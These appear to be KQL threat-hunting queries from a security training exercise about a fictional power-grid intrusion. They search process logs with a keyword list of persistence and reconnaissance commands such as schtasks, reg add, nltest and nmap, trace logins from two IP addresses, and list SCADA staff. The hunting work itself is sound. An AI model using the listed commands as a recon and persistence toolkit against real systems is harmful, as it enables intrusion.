ProcessEvents
| where username  == "waho" or username  == "jisaetang" 
| where process_commandline has_any ("schtasks", "reg add", "startup", "HKLM", "HKCU", "sc create", "net use", "whoami", "ipconfig", "systeminfo", "nltest", "nmap", "ping", "arp", "netstat", "tasklist", "wmic", "net user")
| project timestamp, process_commandline, process_name, username // Jibby Saetang

AuthenticationEvents
| where src_ip == "87.250.252.242" or src_ip == "104.244.42.129" //joeisenman //joseph_eisenman@chicagopowergrid.com, kajackson, stmcgrath, jefoley, elnunmaker, ratyler, altorres
| project timestamp, username, result, hostname
| order by timestamp asc

Employees
| where role has "SCADA"
| project name, role

Email
| where sender == "thresher_libero@hotmail.com" 
